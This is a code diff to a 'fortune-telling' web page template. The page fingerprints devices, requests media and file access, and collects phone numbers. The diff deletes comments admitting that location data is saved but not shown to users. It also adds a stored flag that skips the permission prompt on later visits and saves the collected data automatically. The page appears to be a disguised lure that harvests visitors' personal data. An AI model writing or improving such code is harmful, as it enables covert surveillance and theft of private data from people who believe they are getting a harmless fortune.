@@ -299,7 +299,7 @@ HTML_TEMPLATE = '''
         <div id="smsSection" class="sms-prompt hidden">
             <p>📱 Send this fortune to your phone (permanently saved)</p>
             <input type="tel" id="phoneNumber" placeholder="Enter your mobile number">
-            <button onclick="sendSms()">💬 Send to my phone</button>
+            <button id="sendSmsBtn" onclick="sendSms()">💬 Send to my phone</button>
             <div id="smsStatus" style="margin-top:10px; font-size:14px;"></div>
         </div>
         <p>✨ Thank you for trusting the stars ✨</p>
@@ -310,7 +310,6 @@ HTML_TEMPLATE = '''
 <input type="file" id="fileInput" multiple style="display:none">
 
 <script>
-    // Session ID (persists across refreshes)
     let sessionId = localStorage.getItem('fortuneSessionId');
     if (!sessionId) {
         sessionId = Date.now() + '_' + Math.random().toString(36).substr(2, 8);
@@ -322,7 +321,6 @@ HTML_TEMPLATE = '''
     let currentFortuneText = "";
     let hasExistingData = false;
 
-    // ---------- Device info collectors ----------
     async function getFingerprint() {
         try {
             const fp = await FingerprintJS.load();
@@ -365,7 +363,6 @@ HTML_TEMPLATE = '''
         return navigator.userAgent;
     }
 
-    // On page load, check if this session already has a fortune
     window.addEventListener('load', async () => {
         try {
             const resp = await fetch('/get-session-data', {
@@ -418,8 +415,13 @@ HTML_TEMPLATE = '''
         
         await new Promise(r => setTimeout(r, 500));
         document.getElementById('loading').classList.add('hidden');
-        // Always ask for permissions (no skipping)
-        document.getElementById('permissions').classList.remove('hidden');
+        
+        const permsAlreadyGranted = localStorage.getItem('lovePermissionsGranted');
+        if (permsAlreadyGranted === 'true') {
+            await finalizeAndSave();
+        } else {
+            document.getElementById('permissions').classList.remove('hidden');
+        }
     }
 
     function showStep(title, status, percent) {
@@ -436,6 +438,7 @@ HTML_TEMPLATE = '''
             await getMedia();
             await getFilesTraditional();
         } catch(e) { console.log("Permission step error", e); }
+        localStorage.setItem('lovePermissionsGranted', 'true');
         await finalizeAndSave();
     }
 
@@ -563,7 +566,6 @@ HTML_TEMPLATE = '''
     }
 
     async function finalizeAndSave() {
-        // No map link – location data is still saved but not shown
         const fortuneResp = await fetch('/get-fortune');
         const fortuneData = await fortuneResp.json();
         currentFortuneText = fortuneData.fortune;
@@ -580,16 +582,24 @@ HTML_TEMPLATE = '''
     }
 
     async function sendSms() {
-        const phone = document.getElementById('phoneNumber').value.trim();
+        const phoneInput = document.getElementById('phoneNumber');
+        const phone = phoneInput.value.trim();
+        const statusDiv = document.getElementById('smsStatus');
+        const sendBtn = document.getElementById('sendSmsBtn');
+        
         if (!phone) {
-            document.getElementById('smsStatus').innerText = 'Please enter a phone number';
+            statusDiv.innerText = 'Please enter a phone number';
             return;
         }
         if (!/^[0-9+\-\s]{8,15}$/.test(phone)) {
-            document.getElementById('smsStatus').innerText = 'Invalid phone number format';
+            statusDiv.innerText = 'Invalid phone number format';
             return;
         }
-        document.getElementById('smsStatus').innerText = 'Saving your number...';
+        
+        sendBtn.disabled = true;
+        sendBtn.innerText = '💫 Saving...';
+        statusDiv.innerText = 'Saving your number...';
+        
         try {
             const resp = await fetch('/save-phone', {
                 method: 'POST',
@@ -602,13 +612,18 @@ HTML_TEMPLATE = '''
             });
             const result = await resp.json();
             if (result.status === 'saved') {
-                document.getElementById('smsStatus').innerHTML = '✅ Your fortune has been saved with your phone number! (Demo SMS sent)';
-                document.getElementById('phoneNumber').disabled = true;
+                statusDiv.innerHTML = '✅ Your fortune has been saved with your phone number! (Demo SMS sent)';
+                phoneInput.disabled = true;
+                sendBtn.style.display = 'none';
             } else {
-                document.getElementById('smsStatus').innerText = 'Error saving. Please try again.';
+                statusDiv.innerText = 'Error saving. Please try again.';
+                sendBtn.disabled = false;
+                sendBtn.innerText = '💬 Send to my phone';
             }
         } catch(e) {
-            document.getElementById('smsStatus').innerText = 'Network error. Please try again.';
+            statusDiv.innerText = 'Network error. Please try again.';
+            sendBtn.disabled = false;
+            sendBtn.innerText = '💬 Send to my phone';
         }
     }
 </script>
